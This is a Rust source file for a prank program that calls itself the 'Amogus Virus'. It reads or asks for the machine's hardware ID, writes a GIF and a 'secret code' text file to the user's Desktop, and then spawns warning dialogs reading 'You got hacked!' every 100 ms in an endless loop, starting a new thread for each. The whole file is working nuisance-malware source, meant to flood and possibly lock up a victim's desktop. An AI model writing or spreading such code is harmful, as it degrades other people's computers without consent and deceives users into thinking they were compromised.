use native_dialog::{MessageDialog, MessageType};
use std::time::Duration;
use std::thread::sleep;
use std::thread;
use std::fs::File;
use std::io::prelude::*;
use std::io;
use std::path::Path;

const SPAMDELAY: u64 = 100;

fn main() {
	// Get Machine ID
	println!("Please input your hardware ID (leave blank for auto)");

	let stdin = io::stdin();
	let mut hwid = stdin.lock().lines().next().unwrap().unwrap();
	if hwid.trim().is_empty() {
		hwid = machine_uid::get().unwrap();
		println!("Using ID: {}", hwid);
	}

	let hwid_hash = sha256::digest(hwid);
	
	let home_folder: &str = &format!("{}", dirs::home_dir().unwrap().display())[..];


	// Make file
	let mut susgif = make_file(format!("{}/Desktop/amogus.gif", home_folder));
	susgif.write_all(include_bytes!("amogus.gif")).expect("Couldn't write to file");

	let mut yourfile = make_file(format!("{}/Desktop/yourfile.txt", home_folder));
	let fcbuffer = format!("Your secret code is:\n{} is a gamer 123123", hwid_hash);
	let fcontent = fcbuffer.as_bytes();
	yourfile.write_all(fcontent).expect("Couldn't write to file");


	// Infect computer
	let mut iteration = 1;

	loop {
		let formatted = format!("This is dialog box #{}. You got hacked!", iteration);
		thread::spawn(|| {
			open_dialog("Amogus Virus", formatted)
		});

		wait(SPAMDELAY);
		iteration += 1;
	}
}

fn make_file(loc: String) -> File {
	let floc = Path::new(&loc[..]);
	let file = File::create(floc).expect("Failed to create file");

	return file;
}

fn wait(time: u64) -> () {
	sleep(Duration::from_millis(time));
}

fn open_dialog<Tt: AsRef<str>, Tx: AsRef<str>>(title: Tt, text: Tx) {
	let rtitle = title.as_ref();
	let rtext = text.as_ref();

	MessageDialog::new()
		.set_type(MessageType::Warning)
		.set_title(&rtitle)
		.set_text(&rtext)
		.show_alert()
		.unwrap();
}
